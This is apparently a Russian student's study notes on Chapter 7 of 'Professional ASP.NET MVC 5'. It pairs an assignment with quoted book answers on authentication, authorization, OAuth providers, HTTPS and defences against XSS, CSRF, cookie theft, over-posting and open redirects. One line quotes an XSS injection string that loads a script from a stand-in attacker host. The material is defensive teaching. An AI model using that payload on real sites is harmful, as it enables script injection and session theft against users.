# Изучение Главы 7 книги "Professional ASP.NET MVC 5".
              
Практическое задание к Главе 7:
- создайте приложение с аутентификацией, предусматривающей индивидуальные учетные записи пользователей (см. соответвующую опцию)
- в созданном приложении посмотрите код контроллеров и приведите пример контроллера, обязывающего пройти аутентификацию/авторизацию, приведите пример действия контроллера, явно разрешающего анонимный доступ и объясните, зачем в данном случае разрешен анонимный доступ
- запретите анонимный доступ к контроллеру HomeController, явно разрешите анонимный доступ к действию About контроллера Home, запретите анонимный доступ ко всем контроллерам приложения, разрешите доступ к действию Index контроллера HomeController только для пользователя John и для пользователей с ролью Admin
- добавьте свойство Address в учетную запись, обновив классы RegisterViewModel (AccountViewModels.cs), ApplicationUser (IdentityModels.cs) и соответвующие действие контроллера и представление для регистрации учетной записи. Есть пример добавления новых свойств в учетную запись: https://blogs.msdn.microsoft.com/webdev/2013/10/16/customizing-profile-information-in-asp-net-identity-in-vs-2013-templates/
- добавьте возможность обращение к вашему приложению при использовании SSL/HTTPS, для контроллера Home разрешите обращение только посредством SSL/HTTPS
- добавьте возможность логиниться посредством сторонней аутентификации, одного из распространенных провайдеров аутентификации, например Google
(инструкция: https://docs.microsoft.com/en-us/aspnet/mvc/overview/security/create-an-aspnet-mvc-5-app-with-facebook-and-google-oauth2-and-openid-sign-on
используйте URL без / в конце: https://localhost:44300
вызов NuGet: TOOLS > NuGet Package Manager > Manage NuGet Packages for Solution)
- проверьте представление Index для контроллера Home, обеспечивается ли предотвращение XSS-аттак
- проверьте действия контроллера Home, установлен ли аттрибут, предотвращающий Cross-Site Request Forgery аттаку, если не установлен, то установите его
- обеспечьте сохранность кукисов (для модели учетной записи), используемых в приложении, от хищения посредством JavaScript https://msdn.microsoft.com/en-us/library/ms228262(v=vs.100).aspx
- проверьте, устойчив ли POST метод Login контроллера Account к Open Redirect аттакам
- в корневом каталоге приложения создайте страницу Error.html и обеспечьте перенаправление на эту страницу в случае возникновения ошибки, запустите приложение и сгенерируйте ошибку посредством обращения к несуществующему контроллеру
              
Контрольные вопросы к Главе 7:
- **Что такое аутентификация? Что такое авторизация?**
> Аутентификация - это процесс идентицификации пользователя, то есть грубо говоря мы узнаем, что за пользователь посетил веб-приложение, using some form of login mechanism (username/password, OpenID, OAuth and so on — something that says “this is who I am”).

> Авторизация уже представляет процесс определения прав, которые могут быть даны аутентифицированному пользователю, его возможностей по доступу к ресурсам веб-приложения. This is usually achieved using some type of role-based or claim-based system.

- **Как предотвратить анонимное обращение к действию контроллера? ко всем действиям контроллера? ко всему ASP.NET MVC приложению? как разрешить анонимный доступ к определенному действию или контроллеру?**
> Атрибут Authorize, который устанавливается либо для одиночного действия контроллера, либо для всего контроллера.
```c#
[Authorize]
public ActionResult Index()
{
    return View();
}
--------------------------------------------
[Authorize]
public class CheckoutController : Controller
```
> И после установки атрибута к данному ресурсу получат доступ только те пользователи, которые успешно осуществили вход в веб-приложение.

> To register the AuthorizeAttribute as a global filter, add it to the global filters collection in the
RegisterGlobalFilters method, located in \App_Start\FilterConfig.cs:
```c#
public static void RegisterGlobalFilters(GlobalFilterCollection filters) {
filters.Add(new System.Web.Mvc.AuthorizeAttribute());
filters.Add(new HandleErrorAttribute());
}
```
> This applies the AuthorizeAttribute to all controller actions in the application.

> You can place AllowAnonymous on any methods
(or entire controllers) to opt out of authorization as desired.
For an example, you can see the default AccountController in a new MVC 5 application using
Individual Accounts for authentication. All methods that would require external access if the
AuthorizeAttribute were registered as a global filter are decorated with the AllowAnonymous
attribute. For example, the Login HTTP Get action appears, as follows:
```c#
// GET: /Account/Login
[AllowAnonymous]
public ActionResult Login(string returnUrl)
{
ViewBag.ReturnUrl = returnUrl;
return View();
}
```
> This way, even if you register the AuthorizeAttribute as a global filter, users can access the login
actions.

> Although AllowAnonymous solves this specifi c problem, it only works with the standard
AuthorizeAttribute; it won’t necessarily work with custom authorization filters. If you’re using
custom authorization filters, you’ll want to use a new feature in MVC 5: override filters. These allow
you to locally override any filter (for example, any custom authorization filter that derives from
IAuthorizationFilters).

- **Как аттрибут Authorize работает?**
> The AuthorizeAttribute is an authorization filter, which means that it executes before the associated
controller action. The AuthorizeAttribute performs its main work in the OnAuthorization
method, which is a standard method defined in the IAuthorizationFilter interface.

- **Как работает аутентификация Windows и как ее сконфигурировать для приложения (IIS 7/8, IIS Express)?**
> When you select the Windows Authentication option, authentication is effectively handled outside
of the application by the web browser, Windows, and IIS. For this reason, Startup.Auth.cs is not
included in the project, and no authentication middleware is configured.

> Because Registration and Log On with Windows Authentication are handled outside of the web
application, this template also doesn’t require the AccountController or the associated models
and views. To configure Windows Authentication, this template includes the following line in web
.config:
```<authentication mode="Windows" />```

> To use the Intranet authentication option, you’ll need to enable Windows authentication and disable Anonymous authentication.

> **IIS 7 and IIS 8**

> Complete the following steps to confi gure Intranet authentication when running under IIS 7 and
> IIS 8:
> 1. Open IIS Manager and navigate to your website.
> 2. In Features View, double-click Authentication.
> 3. On the Authentication page, select Windows authentication. If Windows authentication is
not an option, you’ll need to make sure Windows authentication is installed on the server.

> To enable Windows authentication in Windows:
> > a. In the Control Panel, open Programs and Features.

> > b. Select Turn Windows features on or off.

> > c. Navigate to Internet Information Services ➪ World Wide Web Services ➪ Security and
make sure the Windows authentication node is checked.

> To enable Windows authentication on Windows Server:
> > a. In the Server Manager, select Web Server (IIS) and click Add Role Services.

> > b. Navigate to Web Server ➪ Security and make sure the Windows authentication node is
checked.

> 4. In the Actions pane, click Enable to use Windows authentication.
> 5. On the Authentication page, select Anonymous authentication.
> 6. In the Actions pane, click Disable to disable anonymous authentication.

> **IIS Express**

> Complete the following steps to confi gure Intranet authentication when running under IIS 7
and IIS 8:
> 1. Click your project in the Solution Explorer to select the project.
> 2. If the Properties pane is not open, open it (F4).
> 3. In the Properties pane for your project:
> > a. Set Anonymous Authentication to Disabled.

> > b. Set Windows Authentication to Enabled.

- **Как ограничить действия контроллера для определенных ролей и/или пользователей?**
> Система авторизации в mvc позволяет настроить доступ к ресурсам сайта для отдельных пользователей или групп пользователей. Для подобной настройки можно использовать два свойства атрибута AuthorizeAtribute:

> 1. Users - содержит перечисление имен пользователей, которым разрешен вход
> 2. Roles - содержит перечисление имен ролей, которым разрешен вход
```c#
[Authorize(Roles="UsersNamedScott", Users="Jon,Phil,Brad,David")]
public class TopSecretController:Controller
-----------------------------------------------------------------
[Authorize (Roles="admin, moderator", Users="eugene, sergey")]
public ActionResult Edit()
{
    .............
}
```
- **Users vs Roles. Roles vs Claims.**
> Managing your permissions based on roles instead of users is generally considered
a better idea, for several reasons:

> ➤ Users can come and go, and a specific user is likely to require (or lose) permissions
over time.

> ➤ Managing role membership is generally easier than managing user membership.
If you hire a new office administrator, you can easily add her to an
Administrator role without a code change. If adding a new administrative
user to your system requires you to modify all your Authorize attributes and
deploy a new version of the application assembly, people will laugh at you.

> ➤ Role-based management enables you to have different access lists across
deployment environments. You might want to grant developers Administrator
access to a payroll application in your development and stage environments,
but not in production.

> When you’re creating role groups, consider using privileged-based role groups.
For example, roles named CanAdjustCompensation and CanEditAlbums are
more granular and ultimately more manageable than overly generic groups like
Administrator followed by the inevitable SuperAdmin and the equally inevitable
SuperSuperAdmin.

> Here’s the easy way to understand the difference between roles and claims: Role membership
is a simple Boolean—a user either is a member of the role or not. A claim can
contain a value, not just a simple Boolean. This means that users’ claims might
include their username, their corporate division, the groups or level of other
users they are allowed to administer, and so on. So with claims, you wouldn’t
need a bunch of roles to manage the extent of compensation adjustment powers
(CanAdjustCompensationForEmployees, CanAdjustCompensationForManagers,
and so on). A single claim token can hold rich information about exactly which
employees you rule.

> This means that roles are really a specific case of claims, because membership in a
role is just one simple claim.

- **Как добавить дополнительные поля в профайл пользователя?**
> One of the design requirements for ASP.NET Identity is to allow for extensive customization without
undue pain. Some of the extensibility points include:

> ➤ Adding additional user profile data is now trivial.

> ➤ Persistance control is supported through the use of UserStore and RoleStore abstractions over
the data access layer.

> ➤ The RoleManager makes it easy to create roles and manage role membership.

> **Storing additional user profile data**
> It’s a very common requirement to store additional information about your users: birthday, Twitter
handle, site preferences, etc. In the past, adding additional profile data was unnecessarily difficult.
> In ASP.NET Identity, users are modeled using an Entity Framework Code First model, so adding
additional information to your users is as simple as adding properties to your ApplicationUser
class (found in /Models/IdentityModels.cs). For example, to add an Address and Twitter handle
to your user, youd just add the following properties:
```c#
public class ApplicationUser : IdentityUser
{
public string Address { get; set; }
public string TwitterHandle { get; set; }
}
```
- **Какие классы используются для управления ролями и пользователями в ASP.NET Identity?**
> ASP.NET Identity includes a UserManager and RoleManager which make it easy to perform common
tasks like creating users and roles, adding users to roles, checking if a user is in a role, etc.

- **Стороння аутентификация и ее преимущества.**
> Although traditional membership is a great fit in a lot of web applications, it comes with some serious
downsides:

> ➤ Maintaining a local database of usernames and secret passwords is a large security liability.
Large security breaches involving hundreds of thousands of users’ account information (often
including unencrypted passwords) have become common. Worse, because many users reuse
passwords on multiple websites, compromised accounts may affect your users’ security on
their banking or other sensitive websites.

> ➤ Website registration is annoying. Users have gotten tired of filling out forms, complying with
widely differing password policies, remembering passwords, and worrying whether your
site is going to keep their information secure. A significant percentage of potential users will
decide they would rather not bother with registering for your site.
OAuth and OpenID are open standards for authentication. These protocols allow your users to log
in to your site using their existing accounts on other trusted sites (called providers), such as Google,
Twitter, Microsoft, and others.

- **Registering External Login Providers. Configuring OpenID Providers. Configuring OAuth Providers.**
> You need to explicitly enable external sites for login. Fortunately, this task is extremely simple to do.
Authorization providers are confi gured in App_Start\Startup.Auth.cs. When you create a new
application, all authentication providers in Startup.Auth.cs are commented out and will appear as
follows:
```c#
public partial class Startup
{
    // For more information on configuring authentication,
    // please visit http://go.microsoft.com/fwlink/?LinkId=301864
    public void ConfigureAuth(IAppBuilder app)
    {
        // Enable the application to use a cookie to store
        // information for the signed in user
        app.UseCookieAuthentication(new CookieAuthenticationOptions
        {
            AuthenticationType = DefaultAuthenticationTypes.ApplicationCookie, 
            LoginPath = new PathString("/Account/Login")
        });
        // Use a cookie to temporarily store information about
        // a user logging in with a third party login provider
        app.UseExternalSignInCookie(DefaultAuthenticationTypes.ExternalCookie);
        // Uncomment the following lines to enable logging in
        // with third party login providers
        //app.UseMicrosoftAccountAuthentication(
        // clientId: "",
        // clientSecret: "");
        //app.UseTwitterAuthentication(
        // consumerKey: "",
        // consumerSecret: "");
        //app.UseFacebookAuthentication(
        // appId: "",
        // appSecret: "");
        //app.UseGoogleAuthentication();
    }
}
```
> Sites that use an OAuth provider (Facebook, Twitter, and Microsoft) require you to register your site
as an application. When you do, you’ll be provided a client id and a secret. Your site uses these to
authenticate with the OAuth provider. Sites that implement OpenID (such as Google and Yahoo!) do
not require you to register an application, and you won’t need a client id or secret.

> Configuring an OpenID provider is relatively simple, because no registration is required and there
are no parameters to fi ll in. There’s just one OpenID middleware implementation that ships with
ASP.NET MVC 5: Google.

> Although the code involved in confi guring an OAuth provider is very similar to the OpenID case,
the process of registering your site as an application varies by provider. The MVC 5 project template
(when using Individual Account for authentication) includes support for three specifi c OAuth
providers (Microsoft, Facebook, and Twitter) as well as a generic OAuth implementation.

> When registration is complete, the provider will issue you a client id and secret, and you can plug
them right into the commented-out methods shown in AuthConfig.cs. For example, assume you
registered a Facebook application and were provided an App ID “123456789012” and App Secret
“abcdefabcdefdecafbad.” (Note that these are examples and will not work.) You could then enable
Facebook authentication using the following call in Startup.Auth.cs:
```c#
public partial class Startup
{
    public void ConfigureAuth(IAppBuilder app)
    {
        // Use a cookie to temporarily store information about
        // a user logging in with a third party login provider
        app.UseExternalSignInCookie(
            DefaultAuthenticationTypes.ExternalCookie);
        app.UseFacebookAuthentication(
            appId: "123456789012",
            appSecret: "abcdefabcdefdecafbad");
    }
}
```
- **Соображения безопасности при использовании сторонней аутентификации.**
> Trusted External Login Providers
Supporting only providers whose security you trust, which generally means sticking with wellknown
providers, is important for a couple reasons:

> ➤ When you are redirecting your users to external sites, you want to make sure that these sites
are not malicious or poorly secured ones that will leak or misuse your users’ login data or
other information.

> ➤ Authentication providers are giving you information about users—not just their registration
state, but also e-mail addresses and potentially other provider-specifi c information. Although
by default this additional information isn’t stored, reading provider data such as e-mail to
prevent the user from having to re-enter it is not uncommon. A provider could potentially—
either accidentally or maliciously—return information. Displaying any provider information
to the user before you store it is generally a good idea.

- **SSL/HTTPS при аутентификации.**
> The callback from an external provider to your site contains security tokens that allow access to
your site and contain user information. Transmitting this information over HTTPS to prevent interception
while this information travels over the Internet is important.
To enforce HTTPS for this callback, applications that support external logins should require
HTTPS for access to the AccountController’s Login GET method using the RequireHttps
attribute:
```c#
// GET: /Account/Login
[RequireHttps]
[AllowAnonymous]
public ActionResult Login(string returnUrl)
{
    ViewBag.ReturnUrl = returnUrl;
    return View();
}
```
> Enforcing HTTPS during login to your site causes all calls to external providers to occur over
HTTPS, which, in turn, causes the providers to make their callbacks to your site using HTTPS.
Additionally, using HTTPS with Google authentication is important. Google reports a user who
logs in once via HTTP and later via HTTPS as two different people. Always requiring HTTPS
prevents this problem.

- **Виды угроз безопасности веб приложений и способы их предотвращения, в частности в контексте ASP.NET MVC.**
> **Threat: Cross-Site Scripting**

> XSS can be carried out in one of two ways: by a user entering nasty script commands into a website
that accepts unsanitized user input or by user input being directly displayed on a page. The fi rst
example is called passive injection—whereby a user enters nastiness into a textbox, for example,
and that script gets saved into a database and redisplayed later. The second is called active injection
and involves a user entering nastiness into an input, which is immediately displayed onscreen.

> **Preventing XSS**
> This section outlines the various ways to prevent XSS attacks in your MVC applications.

> **HTML Encode All Content**

> Most of the time, you can avoid XSS by using simple HTML encoding—the process by which the
server replaces HTML-reserved characters (like < and >) with codes. You can do this with MVC in
the view simply by using Html.Encode or Html.AttributeEncode for attribute values.

> If you get only one thing from this chapter, please let it be this: Every bit of output on your pages
should be HTML encoded or HTML attribute encoded. I said this at the beginning of the chapter,
but I want to say it again: Html.Encode is your best friend.

> The ASP.NET 4 HTML Encoding Code Block
syntax makes this easier because you can replace:
```<% Html.Encode(Model.FirstName) %>```
with the much shorter:
```<%: Model.FirstName %>```
The Razor view engine HTML encodes output by default, so a model property
displayed using:
```@Model.FirstName```
> will be HTML encoded without any additional work on your part.

> If you are absolutely certain that the data has already been sanitized or comes
only from a trusted source (such as yourself), you can use an HTML helper to
output the data verbatim:
```@Html.Raw(Model.HtmlContent)```

> **Html.AttributeEncode and Url.Encode**

> Most of the time the HTML output on the page gets all the attention; however, protecting any attributes
that are dynamically set in your HTML is also important. In the original example shown previously,
you saw how to spoof the author’s URL by injecting some malicious code into it. This was
accomplished because the sample outputs the anchor tag like this:
```<a href="<%=Url.Action(AuthorUrl)%>"><%=AuthorUrl%></a>```
> To properly sanitize this link, you need to be sure to encode the URL that you’re expecting. This
replaces reserved characters in the URL with other characters (" " with %20, for example).
You might also have a situation in which you’re passing a value through the URL based on user
input from somewhere on your site:
```<a href="<%=Url.Action("index","home",new {name=ViewData["name"]})%>">Go home</a>```
If the user is evil, she could change this name to:
```"></a><script src="http://srizbitrojan.evil.example.com"></script> <a href="```
and then pass that link on to unsuspecting users. You can avoid this by using encoding with Url.
Encode or Html.AttributeEncode:
```<a href="<%=Url.Action("index","home",new
{name=Html.AttributeEncode(ViewData["name"])})%>">Click here</a>```
or:
```<a href="<%=Url.Encode(Url.Action("index","home",
new {name=ViewData["name"]}))%>">Click here</a>```
Bottom line: Never, ever trust any data that your user can somehow touch or use. This includes
any form values, URLs, cookies, or personal information received from third-party sources such
as OpenID. Remember that the databases or services your site accesses can be compromised, too.
Anything input to your application is suspect, so you need to encode everything you possibly can.

> **JavaScript Encoding**
Just HTML encoding everything isn’t necessarily enough, though. Let’s take a look at a simple
exploit that takes advantage of the fact that HTML encoding doesn’t prevent JavaScript from
executing.
> The narrow solution is to use the Ajax
.JavaScriptStringEncode helper function to encode strings that are used in JavaScript, exactly as you
would use Html.Encode for HTML strings. A more thorough solution is to use the AntiXSS library.
> **Using AntiXSS as the Default Encoder for ASP.NET**
The AntiXSS library can add an additional level of security to your ASP.NET applications. There
are a few important differences in how it works compared with the ASP.NET and MVC encoding
functions, but the most important are as follows:

> ➤ AntiXSS uses a whitelist of allowed characters, whereas ASP.NET’s default implementation
uses a limited blacklist of disallowed characters. By allowing only known safe input, AntiXSS
is more secure than a fi lter that tries to block potentially harmful input.

> ➤ The AntiXSS library is focused on preventing security vulnerabilities in your applications,
whereas ASP.NET encoding is primarily focused on preventing display problems due to
“broken” HTML.

> To use the AntiXSS library, you’ll just need to make a one-line addition to the
httpRuntime section of your web.config:
```<httpRuntime ...
encoderType="System.Web.Security.AntiXss.AntiXssEncoder,System.Web,
Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />```
> With that in place, any time you call Html.Encode or use an <%:%> HTML Encoding Code Block,
the AntiXSS library encodes the text, which takes care of both HTML and JavaScript encoding.
The portions of the AntiXSS library included in .NET 4.5 are

> ➤ HtmlEncode, HtmlFormUrlEncode, and HtmlAttributeEncode

> ➤ XmlAttributeEncode and XmlEncode

> ➤ UrlEncode and UrlPathEncode

> ➤ CssEncode


> **Threat: Cross-Site Request Forgery**

> To fully understand what CSRF is, let’s look at one case: XSS plus a confused deputy. We’ve already
discussed XSS, but the term confused deputy is new and worth discussing. Wikipedia describes a
confused deputy attack as follows:
A confused deputy is a computer program that is innocently fooled by some other
party into misusing its authority. It is a specifi c type of privilege escalation.
http://en.wikipedia.org/wiki/Confused _deputy _problem
In this case, that deputy is your browser, and it’s being tricked into misusing its authority in representing
you to a remote website. To illustrate this, we’ve worked up a rather silly yet annoying
example.

> **Preventing CSRF Attacks**
You might be thinking that this kind of thing should be solved by the framework—and it is! ASP.
NET MVC puts the power in your hands, so perhaps a better way of thinking about this is that
ASP.NET MVC should enable you to do the right thing, and indeed it does!
Token Verifi cation
ASP.NET MVC includes a nice way of preventing CSRF attacks, and it works on the principle of
verifying that the user who submitted the data to your site did so willingly. The simplest way to do
this is to embed a hidden input into each form request that contains a unique value. You can do this
with the HTML Helpers by including this in every form:
```<form action="/account/register" method="post">
@Html.AntiForgeryToken()
…
</form>```
Html.AntiForgeryToken outputs an encrypted value as a hidden input:
```<input type="hidden" value="012837udny31w90hjhf7u">```
This value matches another value that is stored as a session cookie in the user’s browser. When the
form is posted, these values are matched using an ActionFilter:
```
[ValidateAntiforgeryToken]
public ActionResult Register(…)
```
This handles most CSRF attacks — but not all of them. In the previous example, you saw how
users can be registered automatically to your site. The anti-forgery token approach takes out most
CSRF-based attacks on your Register method, but it won’t stop the bots out there that seek to
auto-register (and then spam) users to your site. We will look at ways to limit this kind of thing later
in the chapter.
> **Idempotent GETs**
> Idempotent is a big word, for sure—but it’s a simple concept. If an operation is idempotent, it can
be executed multiple times without changing the result. In general, a good general rule is that you
can prevent a whole class of CSRF attacks by only changing things in your DB or on your site by
using POST. This means registration, logout, login, and so forth. At the very least, this limits the
confused deputy attacks somewhat.

> **HttpReferrer Validation**
> HttpReferrer validation is handled using an ActionFilter, wherein you check to see whether the
client that posted the form values was indeed your site:
```c#
public class IsPostedFromThisSiteAttribute : AuthorizeAttribute
{
public override void OnAuthorize(AuthorizationContext filterContext)
{
if (filterContext.HttpContext != null)
{
if (filterContext.HttpContext.Request.UrlReferrer == null)
throw new System.Web.HttpException("Invalid submission");
if (filterContext.HttpContext.Request.UrlReferrer.Host !=
"mysite.com")
throw new System.Web.HttpException
("This form wasn't submitted from this site!");
}
}
}
```
You can then use this fi lter on the Register method, as follows:
```c#
[IsPostedFromThisSite]
public ActionResult Register(…)
```

> **Threat: Cookie Stealing**
> Websites use cookies to store information between page requests or browsing sessions. Some of
this information is pretty tame—things like site preferences and history. Other information can
contain information the site uses to identify you between requests, such as the ASP.NET Forms
Authentication Ticket.
> There are two types of cookies:

> ➤ Session cookies: Stored in the browser’s memory and are transmitted via the header during
every request.

> ➤ Persistent cookies: Stored in actual text fi les on your computer’s hard drive and are transmitted
the same way.

> The main difference is that session cookies are forgotten when your session ends—persistent cookies
are not, and a site will remember you the next time you come along.

> If you could manage to steal someone’s authentication cookie for a website, you could effectively
assume their identity and carry out all the actions that they are capable of. This type of exploit is
actually very easy—but it relies on XSS vulnerability. The attacker must be able to inject a bit of
script onto the target site in order to steal the cookie.

> **Preventing Cookie Theft with HttpOnly**
The StackOverflow.com attack was facilitated by two things:

> ➤ XSS vulnerability: The site relied on custom anti-XSS code, which generally is not a good
idea; you should rely on things such as BB Code or other ways of allowing your users to
format their input. In this case, an error in the code opened the XSS hole.

> ➤ Cookie vulnerability: The StackOverflow.com cookies were not set to disallow script access
from the client’s browser.

> You can stop script access to all cookies in your site by adding a simple fl ag: HttpOnly. You can set
this fl ag in the web.config, as follows:
```<httpCookies domain="" httpOnlyCookies="true" requireSSL="false" />```
> You can also set it individually for each cookie you write:
```
Response.Cookies["MyCookie"].Value="Remembering you…";
Response.Cookies["MyCookie].HttpOnly=true;
```
> The setting of this fl ag tells the browser to invalidate the cookie if anything but the server sets it
or changes it. This technique is fairly straightforward, and it stops most XSS-based cookie issues,
believe it or not. Because it is rare for scripts to need to access to cookies, this feature should almost
always be used.

> **Threat: Over-Posting**
> ASP.NET MVC Model Binding is a powerful feature that greatly simplifi es the process handling
user input by automatically mapping the input to your model properties based on naming conventions.
However, this presents another attack vector, which can allow your attacker an opportunity
to populate model properties you didn’t even put on your input forms.

> **Preventing Over-Posting with the Bind Attribute**
> The simplest way to prevent an over-posting attack is to use the BindAttribute to explicitly control
which properties you want the Model Binder to bind to. You can place BindAttribute either
on the Model class or in the controller action parameter. You can use either a whitelist approach
(discussed previously), which specifi es all the fi elds you’ll allow binding to [Bind(Include="Name,
Comment")], or you can just exclude fi elds you don’t want to be bound to using a blacklist approach
[Bind(Exclude="ReviewID, ProductID, Product, Approved"]. Generally using a whitelist is a
lot safer, because making sure you just list the properties you want bound is easier than enumerating
all the properties you don’t want bound.
> In MVC 5, scaffolded controllers automatically include a whitelist in the controller actions to
exclude IDs and linked classes.
> Here’s how to annotate the Review model class to only allow binding to the Name and Comment
properties:
```c#
[Bind(Include="Name, Comment")]
public class Review {
public int ReviewID { get; set; } // Primary key
public int ProductID { get; set; } // Foreign key
public Product Product { get; set; } // Foreign entity
public string Name { get; set; }
public string Comment { get; set; }
public bool Approved { get; set; }
}
```
> A second alternative is to use one of the overloads on UpdateModel or TryUpdateModel that accepts
a bind list, like the following:
```UpdateModel(review, "Review", new string[] { "Name", "Comment" });```
> Still another—and arguably, the best—way to deal with over-posting is to avoid binding directly to
the data model. You can do this by using a view model that holds only the properties you want to
allow the user to set. The following view model eliminates the over-posting problem:
```c#
public class ReviewViewModel {
public string Name { get; set; }
public string Comment { get; set; }
}
```
> The benefi t of binding to view models instead of data models is that it’s a lot more foolproof. Rather
than having to remember to include whitelist or blacklists (and keep them up to date), the view
model approach is a generally safe design—the only way something can get bound is if you include it
in your view model.

> **Threat: Open Redirection**

> Any web application that redirects to a URL that is specifi ed via the request, such as the query
string or form data, can potentially be tampered with to redirect users to an external, malicious
URL. This tampering is called an open redirection attack.
Whenever your application logic redirects to a specifi ed URL, you must verify that the redirection
URL hasn’t been tampered with. The login used in the default AccountController for both MVC 1
and MVC 2 didn’t perform this verifi cation, and was vulnerable to open redirection attacks.
A Simple Open Redirection Attack
To understand the vulnerability, let’s look at how the login redirection works in a default MVC
2 Web Application project. In this application, attempting to visit a controller action that has the
AuthorizeAttribute redirects unauthorized users to the /Account/LogOn view. This redirect to /
Account/LogOn includes a returnUrl query string parameter so that the users can be returned to
the originally requested URL after they have successfully logged in.


- **Proper Error Reporting and the Stack Trace. Using Configuration Transforms. Using Retail Deployment Configuration in Production. Using a dedicated Error Loging System.**
> 207-209
